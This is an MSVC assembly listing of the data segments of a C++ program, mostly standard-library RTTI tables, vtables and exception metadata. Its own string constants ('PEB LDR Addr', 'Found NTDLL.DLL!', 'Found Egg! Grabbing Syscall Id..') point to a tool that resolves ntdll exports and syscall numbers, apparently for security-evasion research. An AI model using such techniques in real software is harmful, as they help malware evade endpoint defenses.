rdata$r	SEGMENT
??_R2runtime_error@std@@8 DD imagerel ??_R1A@?0A@EA@runtime_error@std@@8 ; std::runtime_error::`RTTI Base Class Array'
	DD	imagerel ??_R1A@?0A@EA@exception@std@@8
	ORG $+3
rdata$r	ENDS
;	COMDAT ??_R3runtime_error@std@@8
rdata$r	SEGMENT
??_R3runtime_error@std@@8 DD 00H			; std::runtime_error::`RTTI Class Hierarchy Descriptor'
	DD	00H
	DD	02H
	DD	imagerel ??_R2runtime_error@std@@8
rdata$r	ENDS
;	COMDAT ??_R4runtime_error@std@@6B@
rdata$r	SEGMENT
??_R4runtime_error@std@@6B@ DD 01H			; std::runtime_error::`RTTI Complete Object Locator'
	DD	00H
	DD	00H
	DD	imagerel ??_R0?AVruntime_error@std@@@8
	DD	imagerel ??_R3runtime_error@std@@8
	DD	imagerel ??_R4runtime_error@std@@6B@
rdata$r	ENDS
;	COMDAT ??_R1A@?0A@EA@bad_array_new_length@std@@8
rdata$r	SEGMENT
??_R1A@?0A@EA@bad_array_new_length@std@@8 DD imagerel ??_R0?AVbad_array_new_length@std@@@8 ; std::bad_array_new_length::`RTTI Base Class Descriptor at (0,-1,0,64)'
	DD	02H
	DD	00H
	DD	0ffffffffH
	DD	00H
	DD	040H
	DD	imagerel ??_R3bad_array_new_length@std@@8
rdata$r	ENDS
;	COMDAT ??_R2bad_array_new_length@std@@8
rdata$r	SEGMENT
??_R2bad_array_new_length@std@@8 DD imagerel ??_R1A@?0A@EA@bad_array_new_length@std@@8 ; std::bad_array_new_length::`RTTI Base Class Array'
	DD	imagerel ??_R1A@?0A@EA@bad_alloc@std@@8
	DD	imagerel ??_R1A@?0A@EA@exception@std@@8
	ORG $+3
rdata$r	ENDS
;	COMDAT ??_R3bad_array_new_length@std@@8
rdata$r	SEGMENT
??_R3bad_array_new_length@std@@8 DD 00H			; std::bad_array_new_length::`RTTI Class Hierarchy Descriptor'
	DD	00H
	DD	03H
	DD	imagerel ??_R2bad_array_new_length@std@@8
rdata$r	ENDS
;	COMDAT ??_R4bad_array_new_length@std@@6B@
rdata$r	SEGMENT
??_R4bad_array_new_length@std@@6B@ DD 01H		; std::bad_array_new_length::`RTTI Complete Object Locator'
	DD	00H
	DD	00H
	DD	imagerel ??_R0?AVbad_array_new_length@std@@@8
	DD	imagerel ??_R3bad_array_new_length@std@@8
	DD	imagerel ??_R4bad_array_new_length@std@@6B@
rdata$r	ENDS
;	COMDAT ??_R1A@?0A@EA@bad_alloc@std@@8
rdata$r	SEGMENT
??_R1A@?0A@EA@bad_alloc@std@@8 DD imagerel ??_R0?AVbad_alloc@std@@@8 ; std::bad_alloc::`RTTI Base Class Descriptor at (0,-1,0,64)'
	DD	01H
	DD	00H
	DD	0ffffffffH
	DD	00H
	DD	040H
	DD	imagerel ??_R3bad_alloc@std@@8
rdata$r	ENDS
;	COMDAT ??_R2bad_alloc@std@@8
rdata$r	SEGMENT
??_R2bad_alloc@std@@8 DD imagerel ??_R1A@?0A@EA@bad_alloc@std@@8 ; std::bad_alloc::`RTTI Base Class Array'
	DD	imagerel ??_R1A@?0A@EA@exception@std@@8
	ORG $+3
rdata$r	ENDS
;	COMDAT ??_R3bad_alloc@std@@8
rdata$r	SEGMENT
??_R3bad_alloc@std@@8 DD 00H				; std::bad_alloc::`RTTI Class Hierarchy Descriptor'
	DD	00H
	DD	02H
	DD	imagerel ??_R2bad_alloc@std@@8
rdata$r	ENDS
;	COMDAT ??_R4bad_alloc@std@@6B@
rdata$r	SEGMENT
??_R4bad_alloc@std@@6B@ DD 01H				; std::bad_alloc::`RTTI Complete Object Locator'
	DD	00H
	DD	00H
	DD	imagerel ??_R0?AVbad_alloc@std@@@8
	DD	imagerel ??_R3bad_alloc@std@@8
	DD	imagerel ??_R4bad_alloc@std@@6B@
rdata$r	ENDS
;	COMDAT ??_R1A@?0A@EA@exception@std@@8
rdata$r	SEGMENT
??_R1A@?0A@EA@exception@std@@8 DD imagerel ??_R0?AVexception@std@@@8 ; std::exception::`RTTI Base Class Descriptor at (0,-1,0,64)'
	DD	00H
	DD	00H
	DD	0ffffffffH
	DD	00H
	DD	040H
	DD	imagerel ??_R3exception@std@@8
rdata$r	ENDS
;	COMDAT ??_R2exception@std@@8
rdata$r	SEGMENT
??_R2exception@std@@8 DD imagerel ??_R1A@?0A@EA@exception@std@@8 ; std::exception::`RTTI Base Class Array'
	ORG $+3
rdata$r	ENDS
;	COMDAT ??_R3exception@std@@8
rdata$r	SEGMENT
??_R3exception@std@@8 DD 00H				; std::exception::`RTTI Class Hierarchy Descriptor'
	DD	00H
	DD	01H
	DD	imagerel ??_R2exception@std@@8
rdata$r	ENDS
;	COMDAT ??_R4exception@std@@6B@
rdata$r	SEGMENT
??_R4exception@std@@6B@ DD 01H				; std::exception::`RTTI Complete Object Locator'
	DD	00H
	DD	00H
	DD	imagerel ??_R0?AVexception@std@@@8
	DD	imagerel ??_R3exception@std@@8
	DD	imagerel ??_R4exception@std@@6B@
rdata$r	ENDS
;	COMDAT ??_C@_0BA@FOIKENOD@vector?5too?5long@
CONST	SEGMENT
??_C@_0BA@FOIKENOD@vector?5too?5long@ DB 'vector too long', 00H ; `string'
CONST	ENDS
;	COMDAT ?_Static@?1???$_Immortalize_memcpy_image@V_Iostream_error_category2@std@@@std@@YAAEBV_Iostream_error_category2@1@XZ@4U?$_Constexpr_immortalize_impl@V_Iostream_error_category2@std@@@1@A
_DATA	SEGMENT
?_Static@?1???$_Immortalize_memcpy_image@V_Iostream_error_category2@std@@@std@@YAAEBV_Iostream_error_category2@1@XZ@4U?$_Constexpr_immortalize_impl@V_Iostream_error_category2@std@@@1@A DQ FLAT:??_7_Iostream_error_category2@std@@6B@ ; `std::_Immortalize_memcpy_image<std::_Iostream_error_category2>'::`2'::_Static
	DQ	0000000000000005H
_DATA	ENDS
;	COMDAT ??_C@_0BI@CFPLBAOH@invalid?5string?5position@
CONST	SEGMENT
??_C@_0BI@CFPLBAOH@invalid?5string?5position@ DB 'invalid string position'
	DB	00H						; `string'
CONST	ENDS
;	COMDAT ??_C@_01LFCBOECM@?4@
CONST	SEGMENT
??_C@_01LFCBOECM@?4@ DB '.', 00H			; `string'
CONST	ENDS
;	COMDAT ??_C@_02OOPEBDOJ@pP@
CONST	SEGMENT
??_C@_02OOPEBDOJ@pP@ DB 'pP', 00H			; `string'
CONST	ENDS
;	COMDAT ??_C@_02MDKMJEGG@eE@
CONST	SEGMENT
??_C@_02MDKMJEGG@eE@ DB 'eE', 00H			; `string'
CONST	ENDS
;	COMDAT ??_7?$numpunct@D@std@@6B@
CONST	SEGMENT
??_7?$numpunct@D@std@@6B@ DQ FLAT:??_R4?$numpunct@D@std@@6B@ ; std::numpunct<char>::`vftable'
	DQ	FLAT:??_E?$numpunct@D@std@@MEAAPEAXI@Z
	DQ	FLAT:?_Incref@facet@locale@std@@UEAAXXZ
	DQ	FLAT:?_Decref@facet@locale@std@@UEAAPEAV_Facet_base@3@XZ
	DQ	FLAT:?do_decimal_point@?$numpunct@D@std@@MEBADXZ
	DQ	FLAT:?do_thousands_sep@?$numpunct@D@std@@MEBADXZ
	DQ	FLAT:?do_grouping@?$numpunct@D@std@@MEBA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@2@XZ
	DQ	FLAT:?do_falsename@?$numpunct@D@std@@MEBA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@2@XZ
	DQ	FLAT:?do_truename@?$numpunct@D@std@@MEBA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@2@XZ
CONST	ENDS
;	COMDAT ??_C@_02EAOCLKAK@ld@
CONST	SEGMENT
??_C@_02EAOCLKAK@ld@ DB 'ld', 00H			; `string'
CONST	ENDS
;	COMDAT ??_C@_02BDDLJJBK@lu@
CONST	SEGMENT
??_C@_02BDDLJJBK@lu@ DB 'lu', 00H			; `string'
CONST	ENDS
;	COMDAT ??_C@_02HIKPPMOK@Ld@
CONST	SEGMENT
??_C@_02HIKPPMOK@Ld@ DB 'Ld', 00H			; `string'
CONST	ENDS
;	COMDAT ??_C@_02CLHGNPPK@Lu@
CONST	SEGMENT
??_C@_02CLHGNPPK@Lu@ DB 'Lu', 00H			; `string'
CONST	ENDS
;	COMDAT ??_C@_02BBAHNLBA@?$CFp@
CONST	SEGMENT
??_C@_02BBAHNLBA@?$CFp@ DB '%p', 00H			; `string'
CONST	ENDS
;	COMDAT ??_7?$num_put@DV?$ostreambuf_iterator@DU?$char_traits@D@std@@@std@@@std@@6B@
CONST	SEGMENT
??_7?$num_put@DV?$ostreambuf_iterator@DU?$char_traits@D@std@@@std@@@std@@6B@ DQ FLAT:??_R4?$num_put@DV?$ostreambuf_iterator@DU?$char_traits@D@std@@@std@@@std@@6B@ ; std::num_put<char,std::ostreambuf_iterator<char,std::char_traits<char> > >::`vftable'
	DQ	FLAT:??_E?$num_put@DV?$ostreambuf_iterator@DU?$char_traits@D@std@@@std@@@std@@MEAAPEAXI@Z
	DQ	FLAT:?_Incref@facet@locale@std@@UEAAXXZ
	DQ	FLAT:?_Decref@facet@locale@std@@UEAAPEAV_Facet_base@3@XZ
	DQ	FLAT:?do_put@?$num_put@DV?$ostreambuf_iterator@DU?$char_traits@D@std@@@std@@@std@@MEBA?AV?$ostreambuf_iterator@DU?$char_traits@D@std@@@2@V32@AEAVios_base@2@DPEBX@Z
	DQ	FLAT:?do_put@?$num_put@DV?$ostreambuf_iterator@DU?$char_traits@D@std@@@std@@@std@@MEBA?AV?$ostreambuf_iterator@DU?$char_traits@D@std@@@2@V32@AEAVios_base@2@DO@Z
	DQ	FLAT:?do_put@?$num_put@DV?$ostreambuf_iterator@DU?$char_traits@D@std@@@std@@@std@@MEBA?AV?$ostreambuf_iterator@DU?$char_traits@D@std@@@2@V32@AEAVios_base@2@DN@Z
	DQ	FLAT:?do_put@?$num_put@DV?$ostreambuf_iterator@DU?$char_traits@D@std@@@std@@@std@@MEBA?AV?$ostreambuf_iterator@DU?$char_traits@D@std@@@2@V32@AEAVios_base@2@D_K@Z
	DQ	FLAT:?do_put@?$num_put@DV?$ostreambuf_iterator@DU?$char_traits@D@std@@@std@@@std@@MEBA?AV?$ostreambuf_iterator@DU?$char_traits@D@std@@@2@V32@AEAVios_base@2@D_J@Z
	DQ	FLAT:?do_put@?$num_put@DV?$ostreambuf_iterator@DU?$char_traits@D@std@@@std@@@std@@MEBA?AV?$ostreambuf_iterator@DU?$char_traits@D@std@@@2@V32@AEAVios_base@2@DK@Z
	DQ	FLAT:?do_put@?$num_put@DV?$ostreambuf_iterator@DU?$char_traits@D@std@@@std@@@std@@MEBA?AV?$ostreambuf_iterator@DU?$char_traits@D@std@@@2@V32@AEAVios_base@2@DJ@Z
	DQ	FLAT:?do_put@?$num_put@DV?$ostreambuf_iterator@DU?$char_traits@D@std@@@std@@@std@@MEBA?AV?$ostreambuf_iterator@DU?$char_traits@D@std@@@2@V32@AEAVios_base@2@D_N@Z
CONST	ENDS
;	COMDAT ??_C@_1BE@GJOFHIHD@?$AAn?$AAt?$AAd?$AAl?$AAl?$AA?4?$AAd?$AAl?$AAl@
CONST	SEGMENT
??_C@_1BE@GJOFHIHD@?$AAn?$AAt?$AAd?$AAl?$AAl?$AA?4?$AAd?$AAl?$AAl@ DB 'n', 00H
	DB	't', 00H, 'd', 00H, 'l', 00H, 'l', 00H, '.', 00H, 'd', 00H, 'l'
	DB	00H, 'l', 00H, 00H, 00H			; `string'
CONST	ENDS
;	COMDAT ??_C@_0O@JKHBPFAG@?6Assembly?3?5?$CFp@
CONST	SEGMENT
??_C@_0O@JKHBPFAG@?6Assembly?3?5?$CFp@ DB 0aH, 'Assembly: %p', 00H ; `string'
CONST	ENDS
;	COMDAT ??_C@_0BE@PGDPLDOM@?6?$FL?$CL?$FN?5Syscall?5Id?3?5?$CFx@
CONST	SEGMENT
??_C@_0BE@PGDPLDOM@?6?$FL?$CL?$FN?5Syscall?5Id?3?5?$CFx@ DB 0aH, '[+] Sys'
	DB	'call Id: %x', 00H				; `string'
CONST	ENDS
;	COMDAT ??_C@_0CC@GDLBNECE@?6Found?5Egg?$CB?5Grabbing?5Syscall?5Id@
CONST	SEGMENT
??_C@_0CC@GDLBNECE@?6Found?5Egg?$CB?5Grabbing?5Syscall?5Id@ DB 0aH, 'Foun'
	DB	'd Egg! Grabbing Syscall Id..', 00H		; `string'
CONST	ENDS
;	COMDAT ??_C@_0M@ODKJDBAK@?6Window?3?5?$CFp@
CONST	SEGMENT
??_C@_0M@ODKJDBAK@?6Window?3?5?$CFp@ DB 0aH, 'Window: %p', 00H ; `string'
CONST	ENDS
;	COMDAT ??_C@_08OMFPBCCL@?6Egg?3?5?$CFp@
CONST	SEGMENT
??_C@_08OMFPBCCL@?6Egg?3?5?$CFp@ DB 0aH, 'Egg: %p', 00H	; `string'
CONST	ENDS
;	COMDAT ??_C@_0BM@FINOJFAM@?6Function?5Addr?5Ptr?5Data?3?5?$CFp@
CONST	SEGMENT
??_C@_0BM@FINOJFAM@?6Function?5Addr?5Ptr?5Data?3?5?$CFp@ DB 0aH, 'Functio'
	DB	'n Addr Ptr Data: %p', 00H			; `string'
CONST	ENDS
;	COMDAT ??_C@_0BH@MOIEDGH@?6Function?5Addr?5Ptr?3?5?$CFp@
CONST	SEGMENT
??_C@_0BH@MOIEDGH@?6Function?5Addr?5Ptr?3?5?$CFp@ DB 0aH, 'Function Addr '
	DB	'Ptr: %p', 00H				; `string'
CONST	ENDS
;	COMDAT ??_C@_0BF@PMMHMJLI@?6Function?5Found?$CB?3?5?$CFs@
CONST	SEGMENT
??_C@_0BF@PMMHMJLI@?6Function?5Found?$CB?3?5?$CFs@ DB 0aH, 'Function Foun'
	DB	'd!: %s', 00H				; `string'
CONST	ENDS
;	COMDAT ??_C@_0CA@MBJLGEGM@?6Export?5Names?5Directory?5Ptr?3?5?$CFp@
CONST	SEGMENT
??_C@_0CA@MBJLGEGM@?6Export?5Names?5Directory?5Ptr?3?5?$CFp@ DB 0aH, 'Exp'
	DB	'ort Names Directory Ptr: %p', 00H		; `string'
CONST	ENDS
;	COMDAT ??_C@_0CE@LGEJMOEH@?6Export?5Functions?5Directory?5Ptr@
CONST	SEGMENT
??_C@_0CE@LGEJMOEH@?6Export?5Functions?5Directory?5Ptr@ DB 0aH, 'Export F'
	DB	'unctions Directory Ptr: %p', 00H		; `string'
CONST	ENDS
;	COMDAT ??_C@_0BA@LCKOAPAP@?6Image?5Base?3?5?$CFp@
CONST	SEGMENT
??_C@_0BA@LCKOAPAP@?6Image?5Base?3?5?$CFp@ DB 0aH, 'Image Base: %p', 00H ; `string'
CONST	ENDS
;	COMDAT ??_C@_0BH@OBFLALEB@?6NTDLL?5Module?5Base?3?5?$CFp@
CONST	SEGMENT
??_C@_0BH@OBFLALEB@?6NTDLL?5Module?5Base?3?5?$CFp@ DB 0aH, 'NTDLL Module '
	DB	'Base: %p', 00H				; `string'
CONST	ENDS
;	COMDAT ??_C@_01EEMJAFIK@?6@
CONST	SEGMENT
??_C@_01EEMJAFIK@?6@ DB 0aH, 00H			; `string'
CONST	ENDS
;	COMDAT ??_C@_0BH@FJNJOCCD@?6LDR?5InMemLoadList?3?5?$CFp@
CONST	SEGMENT
??_C@_0BH@FJNJOCCD@?6LDR?5InMemLoadList?3?5?$CFp@ DB 0aH, 'LDR InMemLoadL'
	DB	'ist: %p', 00H				; `string'
CONST	ENDS
;	COMDAT ??_C@_0BC@LONENMFL@?6PEB?5LDR?5Addr?3?5?$CFp@
CONST	SEGMENT
??_C@_0BC@LONENMFL@?6PEB?5LDR?5Addr?3?5?$CFp@ DB 0aH, 'PEB LDR Addr: %p', 00H ; `string'
CONST	ENDS
;	COMDAT ??_C@_08NHEHJBFE@?6PEB?3?5?$CFp@
CONST	SEGMENT
??_C@_08NHEHJBFE@?6PEB?3?5?$CFp@ DB 0aH, 'PEB: %p', 00H	; `string'
CONST	ENDS
;	COMDAT ??_C@_0BC@JNHAIKLA@?6Found?5NTDLL?4DLL?$CB@
CONST	SEGMENT
??_C@_0BC@JNHAIKLA@?6Found?5NTDLL?4DLL?$CB@ DB 0aH, 'Found NTDLL.DLL!', 00H ; `string'
CONST	ENDS
;	COMDAT ??_C@_0BP@MKMLILOE@?6Not?5Found?4?5Continuing?5Loop?4?4?4@
CONST	SEGMENT
??_C@_0BP@MKMLILOE@?6Not?5Found?4?5Continuing?5Loop?4?4?4@ DB 0aH, 'Not F'
	DB	'ound. Continuing Loop...', 00H		; `string'
CONST	ENDS
;	COMDAT _CT??_R0?AVfailure@ios_base@std@@@8??0failure@ios_base@std@@QEAA@AEBV012@@Z40
xdata$x	SEGMENT
_CT??_R0?AVfailure@ios_base@std@@@8??0failure@ios_base@std@@QEAA@AEBV012@@Z40 DD 00H
	DD	imagerel ??_R0?AVfailure@ios_base@std@@@8
	DD	00H
	DD	0ffffffffH
	ORG $+4
	DD	028H
	DD	imagerel ??0failure@ios_base@std@@QEAA@AEBV012@@Z
xdata$x	ENDS
;	COMDAT ??_R0?AVfailure@ios_base@std@@@8
data$r	SEGMENT
??_R0?AVfailure@ios_base@std@@@8 DQ FLAT:??_7type_info@@6B@ ; std::ios_base::failure `RTTI Type Descriptor'
	DQ	0000000000000000H
	DB	'.?AVfailure@ios_base@std@@', 00H
data$r	ENDS
;	COMDAT _CTA5?AVfailure@ios_base@std@@
xdata$x	SEGMENT
_CTA5?AVfailure@ios_base@std@@ DD 05H
	DD	imagerel _CT??_R0?AVfailure@ios_base@std@@@8??0failure@ios_base@std@@QEAA@AEBV012@@Z40
	DD	imagerel _CT??_R0?AVsystem_error@std@@@8??0system_error@std@@QEAA@AEBV01@@Z40
	DD	imagerel _CT??_R0?AV_System_error@std@@@8??0_System_error@std@@QEAA@AEBV01@@Z40
	DD	imagerel _CT??_R0?AVruntime_error@std@@@8??0runtime_error@std@@QEAA@AEBV01@@Z24
	DD	imagerel _CT??_R0?AVexception@std@@@8??0exception@std@@QEAA@AEBV01@@Z24
xdata$x	ENDS
;	COMDAT _TI5?AVfailure@ios_base@std@@
xdata$x	SEGMENT
_TI5?AVfailure@ios_base@std@@ DD 00H
	DD	imagerel ??1failure@ios_base@std@@UEAA@XZ
	DD	00H
	DD	imagerel _CTA5?AVfailure@ios_base@std@@
xdata$x	ENDS
;	COMDAT ??_C@_0BF@OOHOMBOF@ios_base?3?3eofbit?5set@
CONST	SEGMENT
??_C@_0BF@OOHOMBOF@ios_base?3?3eofbit?5set@ DB 'ios_base::eofbit set', 00H ; `string'
CONST	ENDS
;	COMDAT ??_C@_0BG@FMKFHCIL@ios_base?3?3failbit?5set@
CONST	SEGMENT
??_C@_0BG@FMKFHCIL@ios_base?3?3failbit?5set@ DB 'ios_base::failbit set', 00H ; `string'
CONST	ENDS
;	COMDAT ??_C@_0BF@PHHKMMFD@ios_base?3?3badbit?5set@
CONST	SEGMENT
??_C@_0BF@PHHKMMFD@ios_base?3?3badbit?5set@ DB 'ios_base::badbit set', 00H ; `string'
CONST	ENDS
;	COMDAT ??_7failure@ios_base@std@@6B@
CONST	SEGMENT
??_7failure@ios_base@std@@6B@ DQ FLAT:??_R4failure@ios_base@std@@6B@ ; std::ios_base::failure::`vftable'
	DQ	FLAT:??_Efailure@ios_base@std@@UEAAPEAXI@Z
	DQ	FLAT:?what@exception@std@@UEBAPEBDXZ
CONST	ENDS
;	COMDAT ??_7?$ctype@_W@std@@6B@
CONST	SEGMENT
??_7?$ctype@_W@std@@6B@ DQ FLAT:??_R4?$ctype@_W@std@@6B@ ; std::ctype<wchar_t>::`vftable'
	DQ	FLAT:??_E?$ctype@_W@std@@MEAAPEAXI@Z
	DQ	FLAT:?_Incref@facet@locale@std@@UEAAXXZ
	DQ	FLAT:?_Decref@facet@locale@std@@UEAAPEAV_Facet_base@3@XZ
	DQ	FLAT:?do_is@?$ctype@_W@std@@MEBAPEB_WPEB_W0PEAF@Z
	DQ	FLAT:?do_is@?$ctype@_W@std@@MEBA_NF_W@Z
	DQ	FLAT:?do_scan_is@?$ctype@_W@std@@MEBAPEB_WFPEB_W0@Z
	DQ	FLAT:?do_scan_not@?$ctype@_W@std@@MEBAPEB_WFPEB_W0@Z
	DQ	FLAT:?do_tolower@?$ctype@_W@std@@MEBAPEB_WPEA_WPEB_W@Z
	DQ	FLAT:?do_tolower@?$ctype@_W@std@@MEBA_W_W@Z
	DQ	FLAT:?do_toupper@?$ctype@_W@std@@MEBAPEB_WPEA_WPEB_W@Z
	DQ	FLAT:?do_toupper@?$ctype@_W@std@@MEBA_W_W@Z
	DQ	FLAT:?do_widen@?$ctype@_W@std@@MEBAPEBDPEBD0PEA_W@Z
	DQ	FLAT:?do_widen@?$ctype@_W@std@@MEBA_WD@Z
	DQ	FLAT:?do_narrow@?$ctype@_W@std@@MEBAPEB_WPEB_W0DPEAD@Z
	DQ	FLAT:?do_narrow@?$ctype@_W@std@@MEBAD_WD@Z
CONST	ENDS
;	COMDAT ??_7?$ctype@D@std@@6B@
CONST	SEGMENT
??_7?$ctype@D@std@@6B@ DQ FLAT:??_R4?$ctype@D@std@@6B@	; std::ctype<char>::`vftable'
	DQ	FLAT:??_E?$ctype@D@std@@MEAAPEAXI@Z
	DQ	FLAT:?_Incref@facet@locale@std@@UEAAXXZ
	DQ	FLAT:?_Decref@facet@locale@std@@UEAAPEAV_Facet_base@3@XZ
	DQ	FLAT:?do_tolower@?$ctype@D@std@@MEBAPEBDPEADPEBD@Z
	DQ	FLAT:?do_tolower@?$ctype@D@std@@MEBADD@Z
	DQ	FLAT:?do_toupper@?$ctype@D@std@@MEBAPEBDPEADPEBD@Z
	DQ	FLAT:?do_toupper@?$ctype@D@std@@MEBADD@Z
	DQ	FLAT:?do_widen@?$ctype@D@std@@MEBAPEBDPEBD0PEAD@Z
	DQ	FLAT:?do_widen@?$ctype@D@std@@MEBADD@Z
	DQ	FLAT:?do_narrow@?$ctype@D@std@@MEBAPEBDPEBD0DPEAD@Z
	DQ	FLAT:?do_narrow@?$ctype@D@std@@MEBADDD@Z
CONST	ENDS
;	COMDAT ??_7ctype_base@std@@6B@
CONST	SEGMENT
??_7ctype_base@std@@6B@ DQ FLAT:??_R4ctype_base@std@@6B@ ; std::ctype_base::`vftable'
	DQ	FLAT:??_Ectype_base@std@@UEAAPEAXI@Z
	DQ	FLAT:?_Incref@facet@locale@std@@UEAAXXZ
	DQ	FLAT:?_Decref@facet@locale@std@@UEAAPEAV_Facet_base@3@XZ
CONST	ENDS
;	COMDAT ??_7facet@locale@std@@6B@
CONST	SEGMENT
??_7facet@locale@std@@6B@ DQ FLAT:??_R4facet@locale@std@@6B@ ; std::locale::facet::`vftable'
	DQ	FLAT:??_Efacet@locale@std@@MEAAPEAXI@Z
	DQ	FLAT:?_Incref@facet@locale@std@@UEAAXXZ
	DQ	FLAT:?_Decref@facet@locale@std@@UEAAPEAV_Facet_base@3@XZ
CONST	ENDS
;	COMDAT ??_C@_04LOAJBDKD@true@
CONST	SEGMENT
??_C@_04LOAJBDKD@true@ DB 'true', 00H			; `string'
CONST	ENDS
;	COMDAT ??_C@_05LAPONLG@false@
CONST	SEGMENT
??_C@_05LAPONLG@false@ DB 'false', 00H			; `string'
CONST	ENDS
;	COMDAT ??_C@_0BA@ELKIONDK@bad?5locale?5name@
CONST	SEGMENT
??_C@_0BA@ELKIONDK@bad?5locale?5name@ DB 'bad locale name', 00H ; `string'
CONST	ENDS
;	COMDAT ??_7_Facet_base@std@@6B@
CONST	SEGMENT
??_7_Facet_base@std@@6B@ DQ FLAT:??_R4_Facet_base@std@@6B@ ; std::_Facet_base::`vftable'
	DQ	FLAT:??_E_Facet_base@std@@UEAAPEAXI@Z
	DQ	FLAT:_purecall
	DQ	FLAT:_purecall
CONST	ENDS
;	COMDAT _CT??_R0?AVbad_cast@std@@@8??0bad_cast@std@@QEAA@AEBV01@@Z24
xdata$x	SEGMENT
_CT??_R0?AVbad_cast@std@@@8??0bad_cast@std@@QEAA@AEBV01@@Z24 DD 00H
	DD	imagerel ??_R0?AVbad_cast@std@@@8
	DD	00H
	DD	0ffffffffH
	ORG $+4
	DD	018H
	DD	imagerel ??0bad_cast@std@@QEAA@AEBV01@@Z
xdata$x	ENDS
;	COMDAT ??_R0?AVbad_cast@std@@@8
data$r	SEGMENT
??_R0?AVbad_cast@std@@@8 DQ FLAT:??_7type_info@@6B@	; std::bad_cast `RTTI Type Descriptor'
	DQ	0000000000000000H
	DB	'.?AVbad_cast@std@@', 00H
data$r	ENDS
;	COMDAT _CTA2?AVbad_cast@std@@
xdata$x	SEGMENT
_CTA2?AVbad_cast@std@@ DD 02H
	DD	imagerel _CT??_R0?AVbad_cast@std@@@8??0bad_cast@std@@QEAA@AEBV01@@Z24
	DD	imagerel _CT??_R0?AVexception@std@@@8??0exception@std@@QEAA@AEBV01@@Z24
xdata$x	ENDS
;	COMDAT _TI2?AVbad_cast@std@@
xdata$x	SEGMENT
_TI2?AVbad_cast@std@@ DD 00H
	DD	imagerel ??1bad_cast@std@@UEAA@XZ
	DD	00H
	DD	imagerel _CTA2?AVbad_cast@std@@
xdata$x	ENDS
;	COMDAT ??_C@_08EPJLHIJG@bad?5cast@
CONST	SEGMENT
??_C@_08EPJLHIJG@bad?5cast@ DB 'bad cast', 00H		; `string'
CONST	ENDS
;	COMDAT ??_7bad_cast@std@@6B@
CONST	SEGMENT
??_7bad_cast@std@@6B@ DQ FLAT:??_R4bad_cast@std@@6B@	; std::bad_cast::`vftable'
	DQ	FLAT:??_Ebad_cast@std@@UEAAPEAXI@Z
	DQ	FLAT:?what@exception@std@@UEBAPEBDXZ
CONST	ENDS
;	COMDAT ?_Iostream_error@?4??message@_Iostream_error_category2@std@@UEBA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@3@H@Z@4QBDB
CONST	SEGMENT
?_Iostream_error@?4??message@_Iostream_error_category2@std@@UEBA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@3@H@Z@4QBDB DB 069H ; `std::_Iostream_error_category2::message'::`5'::_Iostream_error
	DB	06fH
	DB	073H
	DB	074H
	DB	072H
	DB	065H
	DB	061H
	DB	06dH
	DB	020H
	DB	073H
	DB	074H
	DB	072H
	DB	065H
	DB	061H
	DB	06dH
	DB	020H
	DB	065H
	DB	072H
	DB	072H
	DB	06fH
	DB	072H
	DB	00H
CONST	ENDS
;	COMDAT ??_C@_08LLGCOLLL@iostream@
CONST	SEGMENT
??_C@_08LLGCOLLL@iostream@ DB 'iostream', 00H		; `string'
CONST	ENDS
;	COMDAT ??_7_Iostream_error_category2@std@@6B@
CONST	SEGMENT
??_7_Iostream_error_category2@std@@6B@ DQ FLAT:??_R4_Iostream_error_category2@std@@6B@ ; std::_Iostream_error_category2::`vftable'
	DQ	FLAT:??_E_Iostream_error_category2@std@@UEAAPEAXI@Z
	DQ	FLAT:?name@_Iostream_error_category2@std@@UEBAPEBDXZ
	DQ	FLAT:?message@_Iostream_error_category2@std@@UEBA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@2@H@Z
	DQ	FLAT:?default_error_condition@error_category@std@@UEBA?AVerror_condition@2@H@Z
	DQ	FLAT:?equivalent@error_category@std@@UEBA_NAEBVerror_code@2@H@Z
	DQ	FLAT:?equivalent@error_category@std@@UEBA_NHAEBVerror_condition@2@@Z
CONST	ENDS
;	COMDAT _CT??_R0?AV_System_error@std@@@8??0_System_error@std@@QEAA@AEBV01@@Z40
xdata$x	SEGMENT
_CT??_R0?AV_System_error@std@@@8??0_System_error@std@@QEAA@AEBV01@@Z40 DD 00H
	DD	imagerel ??_R0?AV_System_error@std@@@8
	DD	00H
	DD	0ffffffffH
	ORG $+4
	DD	028H
	DD	imagerel ??0_System_error@std@@QEAA@AEBV01@@Z
xdata$x	ENDS
;	COMDAT ??_R0?AV_System_error@std@@@8
data$r	SEGMENT
??_R0?AV_System_error@std@@@8 DQ FLAT:??_7type_info@@6B@ ; std::_System_error `RTTI Type Descriptor'
	DQ	0000000000000000H
	DB	'.?AV_System_error@std@@', 00H
data$r	ENDS
;	COMDAT _CT??_R0?AVsystem_error@std@@@8??0system_error@std@@QEAA@AEBV01@@Z40
xdata$x	SEGMENT
_CT??_R0?AVsystem_error@std@@@8??0system_error@std@@QEAA@AEBV01@@Z40 DD 00H
	DD	imagerel ??_R0?AVsystem_error@std@@@8
	DD	00H
	DD	0ffffffffH
	ORG $+4
	DD	028H
	DD	imagerel ??0system_error@std@@QEAA@AEBV01@@Z
xdata$x	ENDS
;	COMDAT ??_R0?AVsystem_error@std@@@8
data$r	SEGMENT
??_R0?AVsystem_error@std@@@8 DQ FLAT:??_7type_info@@6B@	; std::system_error `RTTI Type Descriptor'
	DQ	0000000000000000H
	DB	'.?AVsystem_error@std@@', 00H
data$r	ENDS
;	COMDAT ??_C@_00CNPNBAHC@@
CONST	SEGMENT
??_C@_00CNPNBAHC@@ DB 00H				; `string'
CONST	ENDS
;	COMDAT ??_7system_error@std@@6B@
CONST	SEGMENT
??_7system_error@std@@6B@ DQ FLAT:??_R4system_error@std@@6B@ ; std::system_error::`vftable'
	DQ	FLAT:??_Esystem_error@std@@UEAAPEAXI@Z
	DQ	FLAT:?what@exception@std@@UEBAPEBDXZ
CONST	ENDS
;	COMDAT ??_C@_02LMMGGCAJ@?3?5@
CONST	SEGMENT
??_C@_02LMMGGCAJ@?3?5@ DB ': ', 00H			; `string'
CONST	ENDS
;	COMDAT ??_7_System_error@std@@6B@
CONST	SEGMENT
??_7_System_error@std@@6B@ DQ FLAT:??_R4_System_error@std@@6B@ ; std::_System_error::`vftable'
	DQ	FLAT:??_E_System_error@std@@UEAAPEAXI@Z
